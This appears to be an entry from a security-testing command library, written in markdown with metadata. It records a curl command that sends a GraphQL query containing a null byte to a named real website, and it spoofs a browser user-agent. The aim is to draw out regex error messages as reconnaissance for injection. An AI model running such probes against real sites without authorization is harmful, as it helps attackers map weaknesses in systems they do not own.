---
data: >-
  curl 'https://wiki.cs.money/graphql' -H 'user-agent: Mozilla/5.0 (Windows NT
  10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121
  Safari/537.36' -H 'content-type: application/json' -H 'accept: */*'
  --data-binary '{"query":"query { search(q: \"\\u0000)\", lang: \"en\") { _id
  weapon_id rarity collection{ _id name } collection_id } }"}' --compressed
tags:
  - regex
  - probe
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:25:53.209Z'
id: 9b2c319e-7ab6-4e8a-afeb-7e4fd612e305
verified: false
validated: true
submitted: true
---
# probe-null-byte

## Command

```bash
curl 'https://wiki.cs.money/graphql' -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36' -H 'content-type: application/json' -H 'accept: */*' --data-binary '{"query":"query { search(q: \"\\u0000)\", lang: \"en\") { _id weapon_id rarity collection{ _id name } collection_id } }"}' --compressed
```

## Description

Probes the GraphQL endpoint with a null byte to elicit regex error messages.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H 'user-agent: ...'` | Browser spoofing | Yes |
| `-H 'content-type: application/json'` | JSON format | Yes |
| `--data-binary` | Query with \u0000 | Yes |
| `--compressed` | Gzip support | No |

## Examples

### Basic Usage

```bash
curl 'https://wiki.cs.money/graphql' -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36' -H 'content-type: application/json' -H 'accept: */*' --data-binary '{"query":"query { search(q: \"\\u0000)\", lang: \"en\") { _id weapon_id rarity collection{ _id name } collection_id } }"}' --compressed
```

## Expected Output

Error: 'value (?=.*\u0000) must not contain null bytes'.

## Related

- [[commands/confirm-mismatched-regex]]
- [[procedures/Probe-Regex-Usage-with-Null-Byte]]
